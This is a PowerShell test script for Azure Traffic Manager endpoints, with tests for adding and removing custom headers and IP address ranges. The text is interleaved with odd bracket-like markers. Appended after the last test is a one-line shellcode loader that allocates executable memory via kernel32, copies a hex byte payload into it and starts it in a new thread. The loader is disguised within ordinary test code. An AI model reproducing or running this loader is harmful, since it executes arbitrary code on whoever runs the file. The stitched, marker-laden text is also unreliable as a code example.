	 -||-> $endpoint =  -||-> New-AzTrafficManagerEndpoint -Name $endpointName -ProfileName $profileName -ResourceGroupName $resourceGroup.ResourceGroupName -Type "ExternalEndpoints" -Target "www.contoso.com" -EndpointStatus "Disabled" -EndpointLocation "West US" <-||-  <-||- 

     -||-> $retrievedProfile =  -||-> Get-AzTrafficManagerProfile -Name $profileName -ResourceGroupName $resourceGroup.ResourceGroupName <-||-  <-||- 
	
     -||-> $retrievedEndpoint = $retrievedProfile.Endpoints[0] <-||- 

	 -||-> Assert-True {  -||-> Add-AzTrafficManagerCustomHeaderToEndpoint -Name "foo" -Value "bar" -TrafficManagerEndpoint $retrievedEndpoint <-||-  } <-||- 

     -||-> Set-AzTrafficManagerEndpoint -TrafficManagerEndpoint $retrievedEndpoint <-||- 

     -||-> $endpoint =  -||-> Get-AzTrafficManagerEndpoint -Name $endpointName -ProfileName $profileName -ResourceGroupName $resourceGroup.ResourceGroupName -Type "ExternalEndpoints" <-||-  <-||- 

	 -||-> Assert-AreEqual "foo" $endpoint.CustomHeaders[0].Name <-||- 
	 -||-> Assert-AreEqual "bar" $endpoint.CustomHeaders[0].Value <-||- 
	 -||-> Assert-AreEqual 1 $endpoint.CustomHeaders.Count <-||- 

	 -||-> Assert-True {  -||-> Remove-AzTrafficManagerCustomHeaderFromEndpoint -Name "foo" -TrafficManagerEndpoint $endpoint <-||-  } <-||- 

     -||-> Set-AzTrafficManagerEndpoint -TrafficManagerEndpoint $endpoint <-||- 

     -||-> $endpoint =  -||-> Get-AzTrafficManagerEndpoint -Name $endpointName -ProfileName $profileName -ResourceGroupName $resourceGroup.ResourceGroupName -Type "ExternalEndpoints" <-||-  <-||- 

     -||-> Assert-AreEqual 0 $endpoint.CustomHeaders.Count <-||- 

	}
    finally
    {
        
         -||-> TestCleanup-RemoveResourceGroup $resourceGroup.ResourceGroupName <-||- 
    } <-||- 
} <-||- 


 -||-> function Test-AddAndRemoveIpAddressRanges
{
	 -||-> $endpointName =  -||-> getAssetname <-||-  <-||- 
	 -||-> $profileName =  -||-> getAssetname <-||-  <-||- 
	 -||-> $resourceGroup =  -||-> TestSetup-CreateResourceGroup <-||-  <-||- 

	 -||-> try
	{
	 -||-> $profile =  -||-> TestSetup-CreateProfile $profileName $resourceGroup.ResourceGroupName "Weighted" <-||-  <-||- 

	 -||-> $endpoint =  -||-> New-AzTrafficManagerEndpoint -Name $endpointName -ProfileName $profileName -ResourceGroupName $resourceGroup.ResourceGroupName -Type "ExternalEndpoints" -Target "www.contoso.com" -EndpointStatus "Disabled" -EndpointLocation "West US" <-||-  <-||- 

     -||-> $retrievedProfile =  -||-> Get-AzTrafficManagerProfile -Name $profileName -ResourceGroupName $resourceGroup.ResourceGroupName <-||-  <-||- 
	
     -||-> $retrievedEndpoint = $retrievedProfile.Endpoints[0] <-||- 

	 -||-> Assert-True {  -||-> Add-AzTrafficManagerIpAddressRange -TrafficManagerEndpoint $retrievedEndpoint -First "2.3.4.0" -Scope 24 <-||-  } <-||- 
	 -||-> Assert-True {  -||-> Add-AzTrafficManagerIpAddressRange -TrafficManagerEndpoint $retrievedEndpoint -First "5.6.0.0" -Last "5.6.255.255" <-||-  } <-||- 

     -||-> Set-AzTrafficManagerEndpoint -TrafficManagerEndpoint $retrievedEndpoint <-||- 

     -||-> $endpoint =  -||-> Get-AzTrafficManagerEndpoint -Name $endpointName -ProfileName $profileName -ResourceGroupName $resourceGroup.ResourceGroupName -Type "ExternalEndpoints" <-||-  <-||- 

     -||-> Assert-AreEqual 2 $endpoint.SubnetMapping.Count <-||- 
	 -||-> Assert-AreEqual "2.3.4.0" $endpoint.SubnetMapping[0].First <-||- 
	 -||-> Assert-AreEqual 24 $endpoint.SubnetMapping[0].Scope <-||- 
	 -||-> Assert-AreEqual "5.6.0.0" $endpoint.SubnetMapping[1].First <-||- 
	 -||-> Assert-AreEqual "5.6.255.255" $endpoint.SubnetMapping[1].Last <-||- 

	 -||-> Assert-True {  -||-> Remove-AzTrafficManagerIpAddressRange -First 2.3.4.0 -TrafficManagerEndpoint $endpoint <-||-  } <-||- 

     -||-> Set-AzTrafficManagerEndpoint -TrafficManagerEndpoint $endpoint <-||- 

     -||-> $endpoint =  -||-> Get-AzTrafficManagerEndpoint -Name $endpointName -ProfileName $profileName -ResourceGroupName $resourceGroup.ResourceGroupName -Type "ExternalEndpoints" <-||-  <-||- 

     -||-> Assert-AreEqual 1 $endpoint.SubnetMapping.Count <-||- 
	 -||-> Assert-AreEqual "5.6.0.0" $endpoint.SubnetMapping[0].First <-||- 
	 -||-> Assert-AreEqual "5.6.255.255" $endpoint.SubnetMapping[0].Last <-||- 
	}
    finally
    {
        
         -||-> TestCleanup-RemoveResourceGroup $resourceGroup.ResourceGroupName <-||- 
    } <-||- 
} <-||- 
 -||-> $NlG = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $NlG -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xda,0xc4,0xd9,0x74,0x24,0xf4,0x5e,0x31,0xc9,0xbb,0x81,0x80,0xda,0x2b,0xb1,0x47,0x31,0x5e,0x18,0x83,0xee,0xfc,0x03,0x5e,0x95,0x62,0x2f,0xd7,0x7d,0xe0,0xd0,0x28,0x7d,0x85,0x59,0xcd,0x4c,0x85,0x3e,0x85,0xfe,0x35,0x34,0xcb,0xf2,0xbe,0x18,0xf8,0x81,0xb3,0xb4,0x0f,0x22,0x79,0xe3,0x3e,0xb3,0xd2,0xd7,0x21,0x37,0x29,0x04,0x82,0x06,0xe2,0x59,0xc3,0x4f,0x1f,0x93,0x91,0x18,0x6b,0x06,0x06,0x2d,0x21,0x9b,0xad,0x7d,0xa7,0x9b,0x52,0x35,0xc6,0x8a,0xc4,0x4e,0x91,0x0c,0xe6,0x83,0xa9,0x04,0xf0,0xc0,0x94,0xdf,0x8b,0x32,0x62,0xde,0x5d,0x0b,0x8b,0x4d,0xa0,0xa4,0x7e,0x8f,0xe4,0x02,0x61,0xfa,0x1c,0x71,0x1c,0xfd,0xda,0x08,0xfa,0x88,0xf8,0xaa,0x89,0x2b,0x25,0x4b,0x5d,0xad,0xae,0x47,0x2a,0xb9,0xe9,0x4b,0xad,0x6e,0x82,0x77,0x26,0x91,0x45,0xfe,0x7c,0xb6,0x41,0x5b,0x26,0xd7,0xd0,0x01,0x89,0xe8,0x03,0xea,0x76,0x4d,0x4f,0x06,0x62,0xfc,0x12,0x4e,0x47,0xcd,0xac,0x8e,0xcf,0x46,0xde,0xbc,0x50,0xfd,0x48,0x8c,0x19,0xdb,0x8f,0xf3,0x33,0x9b,0x00,0x0a,0xbc,0xdc,0x09,0xc8,0xe8,0x8c,0x21,0xf9,0x90,0x46,0xb2,0x06,0x45,0xf2,0xb7,0x90,0xd5,0x07,0xb4,0xef,0x72,0x0a,0xc4,0xed,0xae,0x83,0x22,0xa1,0xfe,0xc3,0xfa,0x01,0xaf,0xa3,0xaa,0xe9,0xa5,0x2b,0x94,0x09,0xc6,0xe1,0xbd,0xa3,0x29,0x5c,0x95,0x5b,0xd3,0xc5,0x6d,0xfa,0x1c,0xd0,0x0b,0x3c,0x96,0xd7,0xec,0xf2,0x5f,0x9d,0xfe,0x62,0x90,0xe8,0x5d,0x24,0xaf,0xc6,0xc8,0xc8,0x25,0xed,0x5a,0x9f,0xd1,0xef,0xbb,0xd7,0x7d,0x0f,0xee,0x6c,0xb7,0x85,0x51,0x1a,0xb8,0x49,0x52,0xda,0xee,0x03,0x52,0xb2,0x56,0x70,0x01,0xa7,0x98,0xad,0x35,0x74,0x0d,0x4e,0x6c,0x29,0x86,0x26,0x92,0x14,0xe0,0xe8,0x6d,0x73,0xf0,0xd5,0xbb,0xbd,0x86,0x37,0x78 <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $jcEK=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $jcEK.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$jcEK,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



